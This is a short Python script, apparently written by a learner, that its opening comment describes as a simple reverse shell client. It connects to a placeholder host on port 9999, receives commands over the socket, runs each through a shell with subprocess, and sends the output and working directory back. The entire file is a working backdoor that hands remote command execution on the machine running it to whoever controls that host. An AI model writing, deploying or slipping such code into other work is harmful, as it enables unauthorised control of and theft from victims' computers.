#I want to create a simple reverse shell for the client side

#Useful libraries that I will be working with -->
import socket
import os
import sys
import subprocess

#Commencing with the code -->
def clientSide(host):
    socket_ = socket.socket()
    port = 9999
    socket_.connect((host, port))

    while True:
        data = socket_.recv(1024)
        if data[:2].decode("utf-8") == "cd":
            os.chdir(data[3:].decode("utf-8"))

        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
            outputByte = cmd.stdout.read() + cmd.stderr.read()
            outputStr = str(outputByte, "utf-8")
            currentWD = os.getcwd() + "> "
            socket_.send(str.encode(outputStr + currentWD))
            print(outputStr)


if __name__ == "__main__":
    host = "host-ip-address"
    clientSide(host)